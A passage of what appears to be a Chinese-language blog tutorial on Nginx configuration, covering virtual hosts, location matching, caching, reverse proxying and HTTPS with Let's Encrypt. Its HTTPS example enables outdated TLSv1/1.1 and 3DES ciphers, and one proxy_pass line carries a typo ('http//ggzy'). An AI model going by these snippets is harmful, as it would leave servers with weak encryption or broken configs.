        <content type="html"><![CDATA[<p>在了解具体的Nginx配置项之前我们需要对于Nginx配置文件的构成有所概念，一般来说，Nginx配置文件会由如下几个部分构成：</p><a id="more"></a><h1 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h1><p>在了解具体的Nginx配置项之前我们需要对于Nginx配置文件的构成有所概念，一般来说，Nginx配置文件会由如下几个部分构成：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 全局块</span><br><span class="line">...              </span><br><span class="line"># events块</span><br><span class="line">events &#123;         </span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line"># http块</span><br><span class="line">http      </span><br><span class="line">&#123;</span><br><span class="line">    # http全局块</span><br><span class="line">    ...   </span><br><span class="line">    # 虚拟主机server块</span><br><span class="line">    server        </span><br><span class="line">    &#123; </span><br><span class="line">        # server全局块</span><br><span class="line">        ...       </span><br><span class="line">        # location块</span><br><span class="line">        location [PATTERN]   </span><br><span class="line">        &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        location [PATTERN] </span><br><span class="line">        &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    # http全局块</span><br><span class="line">    ...     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述配置中我们可以看出，Nginx配置文件由以下几个部分构成：</p><ul><li>全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。</li><li>events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</li><li>http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</li><li>server块：配置虚拟主机的相关参数，一个http中可以有多个server。</li><li>location块：配置请求的路由，以及各种页面的处理情况。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">########### 每个指令必须有分号结束。#################</span><br><span class="line">#user administrator administrators;  #配置用户或者组，默认为nobody nobody。</span><br><span class="line">#worker_processes 2;  #允许生成的进程数，默认为1</span><br><span class="line">#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址</span><br><span class="line">error_log log/error.log debug;  #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span><br><span class="line">events &#123;</span><br><span class="line">    accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on</span><br><span class="line">    multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off</span><br><span class="line">    #use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span><br><span class="line">    worker_connections  1024;    #最大连接数，默认为512</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;   #文件扩展名与文件类型映射表</span><br><span class="line">    default_type  application/octet-stream; #默认文件类型，默认为text/plain</span><br><span class="line">    #access_log off; #取消服务日志    </span><br><span class="line">    log_format myFormat &#x27;$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for&#x27;; #自定义格式</span><br><span class="line">    access_log log/access.log myFormat;  #combined为日志格式的默认值</span><br><span class="line">    sendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span><br><span class="line">    sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span><br><span class="line">    keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。</span><br><span class="line"></span><br><span class="line">    # 定义常量</span><br><span class="line">    upstream mysvr &#123;   </span><br><span class="line">      server 127.0.0.1:7878;</span><br><span class="line">      server 192.168.10.121:3333 backup;  #热备</span><br><span class="line">    &#125;</span><br><span class="line">    error_page 404 https://www.baidu.com; #错误页 </span><br><span class="line">    </span><br><span class="line">    #定义某个负载均衡服务器   </span><br><span class="line">    server &#123;</span><br><span class="line">        keepalive_requests 120; #单连接请求上限次数。</span><br><span class="line">        listen       4545;   #监听端口</span><br><span class="line">        server_name  127.0.0.1;   #监听地址       </span><br><span class="line">        location  ~*^.+$ &#123;       #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。</span><br><span class="line">           #root path;  #根目录</span><br><span class="line">           #index vv.txt;  #设置默认页</span><br><span class="line">           proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表</span><br><span class="line">           deny 127.0.0.1;  #拒绝的ip</span><br><span class="line">           allow 172.18.5.54; #允许的ip           </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="虚拟主机与静态站点"><a href="#虚拟主机与静态站点" class="headerlink" title="虚拟主机与静态站点"></a>虚拟主机与静态站点</h1><blockquote><ul><li><a href="https://link.zhihu.com/?target=https://www.nginx.com/resources/admin-guide/serving-static-content/">SERVING STATIC CONTENT</a></li></ul></blockquote><p>本部分概述如何配置Nginx进行静态内容服务，Nginx的静态内容分发能力还是非常强大的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line"> server &#123;</span><br><span class="line">     listen          80;</span><br><span class="line">     server_name     www.domain1.com;</span><br><span class="line">     access_log      logs/domain1.access.log main;</span><br><span class="line">     location / &#123;</span><br><span class="line">         index index.html;</span><br><span class="line">         root  /var/www/domain1.com/htdocs;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> server &#123;</span><br><span class="line">     listen          80;</span><br><span class="line">     server_name     www.domain2.com;</span><br><span class="line">     access_log      logs/domain2.access.log main;</span><br><span class="line">     location / &#123;</span><br><span class="line">         index index.html;</span><br><span class="line">         root  /var/www/domain2.com/htdocs;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚拟主机配置详解"><a href="#虚拟主机配置详解" class="headerlink" title="虚拟主机配置详解"></a>虚拟主机配置详解</h2><h3 id="主机与端口"><a href="#主机与端口" class="headerlink" title="主机与端口"></a>主机与端口</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">listen 127.0.0.1:8000;</span><br><span class="line">listen *:8000;</span><br><span class="line">listen localhost:8000;</span><br><span class="line"># IPV6</span><br><span class="line">listen [::]:8000;</span><br><span class="line"># other params</span><br><span class="line">listen 443 default_server ssl;</span><br><span class="line">listen 127.0.0.1 default_server accept_filter=dataready backlog=1024</span><br></pre></td></tr></table></figure><h3 id="服务域名"><a href="#服务域名" class="headerlink" title="服务域名"></a>服务域名</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 支持多域名配置</span><br><span class="line">server_name www.barretlee.com barretlee.com;</span><br><span class="line"># 支持泛域名解析</span><br><span class="line">server_name *.barretlee.com;</span><br><span class="line"># 支持对于域名的正则匹配</span><br><span class="line">server_name ~^\.barret\.com$;</span><br></pre></td></tr></table></figure><h3 id="URI匹配"><a href="#URI匹配" class="headerlink" title="URI匹配"></a>URI匹配</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location = / &#123;</span><br><span class="line">    # 完全匹配  =</span><br><span class="line">    # 大小写敏感 ~</span><br><span class="line">    # 忽略大小写 ~*</span><br><span class="line">&#125;</span><br><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    # 前半部分匹配 ^~</span><br><span class="line">    # 可以使用正则，如：</span><br><span class="line">    # location ~* \.(gif|jpg|png)$ &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    # 如果以上都未匹配，会进入这里</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件路径配置"><a href="#文件路径配置" class="headerlink" title="文件路径配置"></a>文件路径配置</h2><h3 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    root /home/barret/test/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location /blog &#123;</span><br><span class="line">    alias /home/barret/www/blog/;</span><br><span class="line">&#125;</span><br><span class="line">location ~ ^/blog/(\d+)/([\w-]+)$ &#123;</span><br><span class="line">    # /blog/20141202/article-name  </span><br><span class="line">    # -&gt; /blog/20141202-article-name.md</span><br><span class="line">    alias /home/barret/www/blog/$1-$2.md;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index /html/index.html /php/index.php;</span><br></pre></td></tr></table></figure><h3 id="重定向页面"><a href="#重定向页面" class="headerlink" title="重定向页面"></a>重定向页面</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_page    404         /404.html;</span><br><span class="line">error_page    502  503    /50x.html;</span><br><span class="line">error_page    404  =200   /1x1.gif;</span><br><span class="line">location / &#123;</span><br><span class="line">    error_page  404 @fallback;</span><br><span class="line">&#125;</span><br><span class="line">location @fallback &#123;</span><br><span class="line">    # 将请求反向代理到上游服务器处理</span><br><span class="line">    proxy_pass http://localhost:9000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="try-files"><a href="#try-files" class="headerlink" title="try_files"></a>try_files</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try_files $uri $uri.html $uri/index.html @other;</span><br><span class="line">location @other &#123;</span><br><span class="line">    # 尝试寻找匹配 uri 的文件，失败了就会转到上游处理</span><br><span class="line">    proxy_pass  http://localhost:9000;</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    # 尝试寻找匹配 uri 的文件，没找到直接返回 502</span><br><span class="line">    try_files $uri $uri.html =502;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="缓存配置"><a href="#缓存配置" class="headerlink" title="缓存配置"></a>缓存配置</h2><blockquote><ul><li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000006689795">HTTP 缓存的四种风味与缓存策略</a></li></ul></blockquote><h3 id="Expire-过期时间"><a href="#Expire-过期时间" class="headerlink" title="Expire:过期时间"></a>Expire:过期时间</h3><p>在Nginx中可以配置缓存的过期时间：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location ~* \.(?:ico|css|js|gif|jpe?g|png)$ &#123;</span><br><span class="line">       expires 30d;</span><br><span class="line">       add_header Vary Accept-Encoding;</span><br><span class="line">               access_log off;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们也可以添加更复杂的配置项：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~* ^.+\.(?:css|cur|js|jpe?g|gif|htc|ico|png|html|xml|otf|ttf|eot|woff|svg)$ &#123;</span><br><span class="line"></span><br><span class="line">    access_log off;</span><br><span class="line">    expires 30d;</span><br><span class="line">    ## No need to bleed constant updates. Send the all shebang in one</span><br><span class="line">    ## fell swoop.</span><br><span class="line">    tcp_nodelay off;</span><br><span class="line">    ## Set the OS file cache.</span><br><span class="line">    open_file_cache max=3000 inactive=120s;</span><br><span class="line">    open_file_cache_valid 45s;</span><br><span class="line">    open_file_cache_min_uses 2;</span><br><span class="line">    open_file_cache_errors off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">events&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">http&#123;</span><br><span class="line">    upstream ggzy &#123;</span><br><span class="line">       server 127.0.0.1:1398 weight=3;</span><br><span class="line">       server 127.0.0.1:1399;</span><br><span class="line">    &#125;</span><br><span class="line">    # 80端口配置，可配置多个Virtual Host</span><br><span class="line">    server &#123;</span><br><span class="line">        listen  80;</span><br><span class="line">        index index index.htm index.py index.html;</span><br><span class="line"></span><br><span class="line">        server_name app.truelore.cn;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass_header Server;</span><br><span class="line">            proxy_set_header Host $http_host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Scheme $scheme;</span><br><span class="line">            proxy_pass http//ggzy;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="NodeJS-Application"><a href="#NodeJS-Application" class="headerlink" title="NodeJS Application"></a>NodeJS Application</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">http.createServer((req, res) =&gt; &#123;</span><br><span class="line">    res.end(&#x27;hello world&#x27;);</span><br><span class="line">&#125;).listen(9000);</span><br></pre></td></tr></table></figure><p>任何请求过来都返回 hello world，简版的 Nginx 配置如下，</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    # 这里可不写东西</span><br><span class="line">    use epoll;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 127.0.0.1:8888;</span><br><span class="line">        # 如果请求路径跟文件路径按照如下方式匹配找到了，直接返回</span><br><span class="line">        try_files $uri $uri/index.html;</span><br><span class="line">        location ~* ^/(js|css|image|font)/$ &#123;</span><br><span class="line">            # 静态资源都在 static 文件夹下</span><br><span class="line">            root /home/barret/www/static/;</span><br><span class="line">        &#125;</span><br><span class="line">        location /app &#123;</span><br><span class="line">            # Node.js 在 9000 开了一个监听端口</span><br><span class="line">            proxy_pass http://127.0.0.1:9000;</span><br><span class="line">        &#125;</span><br><span class="line">        # 上面处理出错或者未找到的，返回对应状态码文件</span><br><span class="line">        error_page    404            /404.html;</span><br><span class="line">        error_page    502  503  504  /50x.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 try_files，尝试直接匹配文件；没找到就匹配静态资源；还没找到就交给 Node 处理；否则就返回 4xx/5xx 的状态码。</p><h2 id="Upstream-Cache"><a href="#Upstream-Cache" class="headerlink" title="Upstream Cache"></a>Upstream Cache</h2><blockquote><ul><li><a href="https://link.zhihu.com/?target=https://www.nginx.com/blog/nginx-caching-guide/">A Guide to Caching with NGINX and NGINX Plus</a></li></ul></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    ,,,,,</span><br><span class="line">    proxy_cache_path /var/cache/nginx/cache levels=1:2 keys_zone=imgcache:100m inactive=1d max_size=10g;</span><br><span class="line">    server &#123;</span><br><span class="line">    ........</span><br><span class="line">        location ~* ^.+\.(js|ico|gif|jpg|jpeg|png|html|htm)$ &#123;</span><br><span class="line">        log_not_found off;</span><br><span class="line">        access_log off;</span><br><span class="line">        expires 7d;</span><br><span class="line">        proxy_pass http://img.example.com ;</span><br><span class="line">        proxy_cache imgcache;</span><br><span class="line">        proxy_cache_valid 200 302 1d;</span><br><span class="line">        proxy_cache_valid 404 10m;</span><br><span class="line">        proxy_cache_valid any 1h;</span><br><span class="line">        proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><blockquote><ul><li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000004985253">HTTPS 理论详解与实践</a></li></ul></blockquote><h2 id="Let’s-Encrypt-证书申请"><a href="#Let’s-Encrypt-证书申请" class="headerlink" title="Let’s Encrypt 证书申请"></a>Let’s Encrypt 证书申请</h2><p>Let’s Encrypt 为我们提供了非常方便的命令行工具<a href="https://link.zhihu.com/?target=https://certbot.eff.org/%23ubuntuxenial-nginx">certbot</a>，笔者是在Ubuntu 16.04的机器上进行配置，因此只要执行如下命令即可:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 安装letsencrypt命令行</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install letsencrypt </span><br><span class="line"># 独立的为example.com与www.example.com申请证书</span><br><span class="line">$ letsencrypt certonly --standalone -d example.com -d www.example.com</span><br><span class="line"># 自动执行证书刷新操作</span><br><span class="line">$ letsencrypt renew --dry-run --agree-tos</span><br></pre></td></tr></table></figure><h2 id="基本HTTPS配置"><a href="#基本HTTPS配置" class="headerlink" title="基本HTTPS配置"></a>基本HTTPS配置</h2><p>基本的HTTPS支持配置如下:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;  </span><br><span class="line">    listen 192.168.1.11:443;  #ssl端口  </span><br><span class="line">    server_name  test.com;  </span><br><span class="line">    #为一个server&#123;......&#125;开启ssl支持  </span><br><span class="line">    ssl on;  </span><br><span class="line">    #指定PEM格式的证书文件   </span><br><span class="line">    ssl_certificate      /etc/nginx/test.pem;   </span><br><span class="line">    #指定PEM格式的私钥文件  </span><br><span class="line">    ssl_certificate_key  /etc/nginx/test.key;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>在真实的生产环境中，我们的配置如下:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 如果需要spdy也可以加上,lnmp1.2及其后版本都默认支持spdy,lnmp1.3 nginx 1.9.5以上版本默认支持http2</span><br><span class="line">    listen 443 ssl;   </span><br><span class="line">    # 这里是你的域名</span><br><span class="line">    server_name www.vpser.net;     </span><br><span class="line">    index index.html index.htm index.php default.html default.htm default.php;</span><br><span class="line">    # 网站目录</span><br><span class="line">    root /home/wwwroot/www.vpser.net;            </span><br><span class="line">    # 前面生成的证书，改一下里面的域名就行</span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/www.vpser.net/fullchain.pem;    </span><br><span class="line">    # 前面生成的密钥，改一下里面的域名就行</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/www.vpser.net/privkey.pem;   </span><br><span class="line">    ssl_ciphers &quot;EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5&quot;;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    ssl_session_cache shared:SSL:10m;</span><br><span class="line"></span><br><span class="line">    #这个是伪静态根据自己的需求改成其他或删除</span><br><span class="line">    include wordpress.conf;  </span><br><span class="line">    </span><br><span class="line">    #error_page 404 /404.html;</span><br><span class="line">    </span><br><span class="line">    location ~ [^/]\.php(/|$)</span><br><span class="line">    &#123;</span><br><span class="line">        # comment try_files $uri =404; to enable pathinfo</span><br><span class="line">        try_files $uri =404;</span><br><span class="line">        fastcgi_pass unix:/tmp/php-cgi.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        # lnmp 1.0及之前版本替换为include fcgi.conf;</span><br><span class="line">        include fastcgi.conf;     </span><br><span class="line">        #include pathinfo.conf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span><br><span class="line">    &#123;</span><br><span class="line">    expires 30d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*\.(js|css)?$</span><br><span class="line">    &#123;</span><br><span class="line">    expires 12h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强制HTTP转到HTTPS"><a href="#强制HTTP转到HTTPS" class="headerlink" title="强制HTTP转到HTTPS"></a>强制HTTP转到HTTPS</h2><h3 id="Nginx-Rewrite"><a href="#Nginx-Rewrite" class="headerlink" title="Nginx Rewrite"></a>Nginx Rewrite</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;  </span><br><span class="line">    listen  192.168.1.111:80;  </span><br><span class="line">    server_name test.com;  </span><br><span class="line">    rewrite ^(.*)$  https://$host$1 permanent;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="Nginx-497错误码"><a href="#Nginx-497错误码" class="headerlink" title="Nginx 497错误码"></a>Nginx 497错误码</h3><p>利用error_page命令将497状态码的链接重定向到<a href="https://link.zhihu.com/?target=https://test.com">https://test.com</a>这个域名上</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;  </span><br><span class="line">    listen       192.168.1.11:443;  #ssl端口  </span><br><span class="line">    listen       192.168.1.11:80;   #用户习惯用http访问，加上80，后面通过497状态码让它自动跳到443端口  </span><br><span class="line">    server_name  test.com;  </span><br><span class="line">    #为一个server&#123;......&#125;开启ssl支持  </span><br><span class="line">    ssl                  on;  </span><br><span class="line">    #指定PEM格式的证书文件   </span><br><span class="line">    ssl_certificate      /etc/nginx/test.pem;   </span><br><span class="line">    #指定PEM格式的私钥文件  </span><br><span class="line">    ssl_certificate_key  /etc/nginx/test.key;  </span><br><span class="line">        </span><br><span class="line">    #让http请求重定向到https请求   </span><br><span class="line">    error_page 497  https://$host$uri?$args;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="Meta刷新，前端跳转"><a href="#Meta刷新，前端跳转" class="headerlink" title="Meta刷新，前端跳转"></a>Meta刷新，前端跳转</h3><p>在HTTP正常返回的页面中添加meta属性：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 